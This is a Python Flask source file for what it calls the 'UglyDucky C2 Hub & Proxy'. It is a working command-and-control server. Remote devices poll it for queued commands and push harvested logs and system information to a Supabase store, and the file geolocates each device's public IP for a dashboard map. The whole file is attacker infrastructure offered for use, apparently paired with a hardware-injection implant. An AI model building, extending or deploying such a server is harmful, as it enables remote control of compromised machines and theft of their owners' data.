# File: c2_listener.py
import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime, timedelta, timezone

app = Flask(__name__)
CORS(app)

# Pull Supabase credentials securely from Render Environment Variables
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")

command_queue = {}
# Cache for node data to reduce Supabase queries
node_cache = {}
CACHE_LIFETIME_SECONDS = 60 # How long to cache node data

# ---------------------------------------------------------
# HELPER FUNCTIONS
# ---------------------------------------------------------
def get_node_status(last_seen_str):
    """Calculates online status based on last seen timestamp."""
    if not last_seen_str:
        return "red", "Offline"
    
    last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
    now = datetime.now(timezone.utc)
    
    if now - last_seen < timedelta(minutes=1):
        return "green", "Online"
    if now - last_seen < timedelta(hours=1):
        return "yellow", "Idle"
    return "red", "Offline"

def geolocate_ip(ip):
    """Gets latitude and longitude from an IP address."""
    if not ip or ip in ["127.0.0.1", "Unknown"]:
        return 37.77, -122.41 # Default to SF if no IP
    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
        if response.ok:
            data = response.json()
            return data.get("latitude", 37.77), data.get("longitude", -122.41)
    except:
        pass # Fallback on error
    return 37.77, -122.41


# ---------------------------------------------------------
# NEW LIVE NODE ENDPOINT
# ---------------------------------------------------------
@app.route('/nodes', methods=['GET'])
def get_all_nodes():
    """Fetches, processes, and returns a list of all nodes for the dashboard."""
    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Supabase key/URL missing in Render Environment"}), 500

    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    
    # Check cache first
    cached_data = node_cache.get('data')
    cache_time = node_cache.get('time')
    if cached_data and cache_time and (datetime.now() - cache_time) < timedelta(seconds=CACHE_LIFETIME_SECONDS):
        return jsonify(cached_data)

    try:
        # 1. Get all unique device_ids and their most recent timestamp
        # This uses a Supabase RPC function 'get_latest_logs_per_device' you need to create.
        # See instructions below.
        # Fallback: query the whole table if RPC fails, but it's slow.
        try:
             # Make sure the RPC function name matches what you create in Supabase
            rpc_url = SUPABASE_URL.replace('/rest/v1', '/rpc/get_latest_logs_per_device')
            response = requests.post(rpc_url, headers=headers)
            response.raise_for_status()
            devices = response.json()
        except requests.exceptions.RequestException:
             # Fallback if RPC doesn't exist - less efficient
            response = requests.get(f"{SUPABASE_URL}?select=device_id,created_at", headers=headers)
            response.raise_for_status()
            all_logs = response.json()
            latest = {}
            for log in all_logs:
                if log['device_id'] not in latest or log['created_at'] > latest[log['device_id']]:
                    latest[log['device_id']] = log['created_at']
            devices = [{"device_id": k, "last_seen": v} for k, v in latest.items()]
            

        node_list = []
        for device in devices:
            device_id = device.get("device_id")
            if not device_id: continue

            # 2. Get the "System Info" for this specific device
            sysinfo_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&category=eq.System Info&select=content&limit=1"
            sysinfo_resp = requests.get(sysinfo_url, headers=headers)
            
            os_info, ip_info = "Unknown OS", "Unknown IP"
            if sysinfo_resp.ok and sysinfo_resp.json():
                content = sysinfo_resp.json()[0]['content']
                # Basic parsing to extract key details
                os_match = next((line for line in content.split('\n') if 'Caption' in line), None)
                ip_match = next((line for line in content.split('\n') if 'PUBLIC IP' in line), None)
                if os_match: os_info = os_match.split('=')[-1].strip()
                if ip_match: ip_info = ip_match.split(':')[-1].strip()

            # 3. Get status and location
            status_color, status_text = get_node_status(device.get("last_seen"))
            lat, lng = geolocate_ip(ip_info)
            
            node_list.append({
                "id": device_id,
                "os": os_info,
                "ip": ip_info,
                "lat": lat,
                "lng": lng,
                "status": status_color,
                "last_seen": device.get("last_seen")
            })

        # Update cache
        node_cache['data'] = node_list
        node_cache['time'] = datetime.now()
        
        return jsonify(node_list)

    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Failed to fetch from Supabase: {e}"}), 500

# ---------------------------------------------------------
# Existing Endpoints (Unchanged)
# ---------------------------------------------------------
@app.route('/issue', methods=['POST'])
def issue_command():
    data = request.json
    device_id, command = data.get('device_id'), data.get('command')
    if not device_id or not command:
        return jsonify({"error": "device_id and command are required"}), 400
    command_queue[device_id] = command
    return jsonify({"status": "command queued"}), 200

@app.route('/poll/<device_id>', methods=['GET'])
def poll_for_command(device_id):
    command = command_queue.pop(device_id, None)
    return jsonify({"command": command})

@app.route('/logs/<device_id>', methods=['GET'])
def get_logs(device_id):
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    url = f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc"
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        return jsonify(response.json()), 200
    except requests.exceptions.RequestException as e:
        return jsonify({"error": "Database fetch failed"}), 500

@app.route('/logs', methods=['POST'])
def push_logs():
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Prefer": "return=minimal,resolution=merge-duplicates"}
    upsert_url = f"{SUPABASE_URL}?on_conflict=device_id,category"
    try:
        response = requests.post(upsert_url, json=request.json, headers=headers, timeout=10)
        response.raise_for_status()
        return jsonify({"status": "success"}), 200
    except requests.exceptions.RequestException as e:
        return jsonify({"error": "Database push failed"}), 500

@app.route('/')
def index():
    return "UglyDucky C2 Hub & Proxy Online."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
